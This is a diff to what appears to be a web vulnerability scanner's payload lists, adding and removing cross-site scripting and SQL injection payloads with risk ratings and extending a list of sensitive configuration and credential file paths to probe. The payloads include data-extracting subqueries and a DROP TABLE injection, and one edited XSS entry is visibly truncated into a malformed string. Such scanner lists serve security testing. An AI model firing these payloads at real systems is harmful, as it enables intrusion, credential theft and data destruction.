@@ -17,18 +17,7 @@ XSS_PAYLOADS = [
     "<a id=x tabindex=1 onfocus=alert(1)></a>,medium",
     "<a id=x tabindex=1 onfocusin=alert(1)></a>,medium",
     "<a onafterscriptexecute=alert(1)><script>1</script>,high",
-    "<a onbeforecopy=\"alert(1)\" contenteditable>test</a>,medium",
-    "<a onbeforecut=\"alert(1)\" contenteditable>test</a>,medium",
-    "<a onbeforescriptexecute=alert(1)><script>1</script>,high",
-    "<a onblur=alert(1) id=x tabindex=1 style=display:block>test</a><input value=clickme>,medium",
-    "<a onclick=\"alert(1)\" style=display:block>test</a>,medium",
-    "<a oncontextmenu=\"alert(1)\" style=display:block>test</a>,medium",
-    "<a oncopy=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test,medium",
-    "<a oncut=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test,medium",
-    "<a ondblclick=\"alert(1)\" autofocus tabindex=1 style=display:block>test</a>,medium",
-    "<button oncut=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test,medium",
-    "<button ondblclick=\"alert(1)\" autofocus tabindex=1 style=display:block>test</button>,medium",
-    "<button onfocusout=alert(1) id=x tabindex=1 style=display:block>test</button><input value=clickme>,medium",
+    "<a onbeforecopy=\"alert(1)\" contenteditable>test</aedium",
     "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>,high",  
     "<math><mi><mtext><img src=x onerror=alert(1)></mtext></mi></math>,high",
     "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>,high",
@@ -58,7 +47,6 @@ XSS_PAYLOADS = [
     "<script>eval('alert(1)')</script>,high",
     "<script>window.onload=alert(1)</script>,high",
     "<svg><animate attributeName='x' values='0;10' dur='1s' onbegin='alert(1)'></animate></svg>,high",
-    "<object data='data:image/svg+xml,<svg><script>alert(1)</script></svg>' type='image/svg+xml'>,high",
     "<a href='javascript:alert(1)'>Click Here</a>,medium",
     "<iframe src='javascript:alert(1)'></iframe>,high",
     "<audio autoplay><source src='test.mp3' onerror='alert(1)'></audio>,high",
@@ -68,7 +56,10 @@ XSS_PAYLOADS = [
     "<a onmouseover='alert(1)'>Hover Me</a>,medium",
     "<svg onload='alert(1)'></svg>,high",
     "<input type='image' src='x' onerror='alert(1)'>,high",
-    "<form onsubmit='alert(1)'><input type='submit'></form>,low"
+    "<form onsubmit='alert(1)'><input type='submit'></form>,low",
+    "<img src=x oNerror=alert(1)>,high",
+    "<img \"\"\"><script>alert(1)</script>,high"
+
 ]
 
 
@@ -77,9 +68,11 @@ XSS_PAYLOADS = [
 # SQL Injection Payloads with risk levels
 SQLI_PAYLOADS = [
     "' OR 1=1 --,high",
-    "' UNION SELECT null, null, username, password FROM users --,high",
     "' OR 'a'='a,medium",
     "' OR 'x'='x' --,medium",
+    "' OR 1=1-- - ,high",
+    "' OR 1=1# ,high",
+    "' OR 1=1/* ,high",
     "AND 1,low",
     "AND 0,low",
     "AND true,low",
@@ -91,12 +84,7 @@ SQLI_PAYLOADS = [
     "1' ORDER BY 1--+,medium",
     "1' ORDER BY 2--+,medium",
     "1' ORDER BY 3--+,medium",
-    "1' ORDER BY 1,2--+,medium",
-    "1' ORDER BY 1,2,3--+,medium",
-    "1' GROUP BY 1,2,--+,medium",
-    "1' GROUP BY 1,2,3--+,medium",
     "GROUP BY columnnames having 1=1 --,medium",
-    "-1' UNION SELECT 1,2,3--+,high",
     "OR 1=1,medium",
     "OR 1=0,low",
     "OR x=x,low",
@@ -126,8 +114,6 @@ SQLI_PAYLOADS = [
     "'; WAITFOR DELAY '00:00:05'--,high",  
     "' AND (SELECT COUNT(*) FROM users WHERE LENGTH(password)>0)=1 --,high",
     "'||(SELECT password FROM users WHERE username='admin')||',high",
-    "' and updatexml(1,concat(0x3a,(SELECT database())),1)--+,high",  
-    "' or if(substr((select user()),1,1)='r',sleep(5),0)--,high",
     "'; DROP TABLE users; --,high",
     "'; SELECT pg_sleep(5); --,high",
     "' AND 1=(SELECT COUNT(*) FROM information_schema.tables); --,high",
@@ -140,8 +126,6 @@ SQLI_PAYLOADS = [
     "' AND (SELECT COUNT(*) FROM users WHERE LENGTH(username)>5)=1 --,high",
     "1' OR 'a'='a' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 1) > 0 --,high",
     "' OR 1=1 LIMIT 1 --,high",
-    "' UNION ALL SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' --,high",
-    "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM users WHERE username='admin')) --,high",
     "' AND sleep(5) --,high",
     "' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE NULL END) --,high",
     "' AND 1 IN (SELECT COUNT(*) FROM users WHERE username='admin') --,medium",
@@ -215,7 +199,13 @@ SENSITIVE_FILES = [
     "/etc/mysql/my.cnf,high",
     "/.terraform/environment.tfvars,high",
     "/var/www/.env,high",
-    "/home/user/.docker/config.json,high"
+    "/home/user/.docker/config.json,high",
+    "/config/.env,high",
+    "/.idea/workspace.xml,medium",
+    "/docker-compose.yml,medium",
+    "/composer.lock,medium",
+    "/yarn.lock,low"
+
 ]
 
 
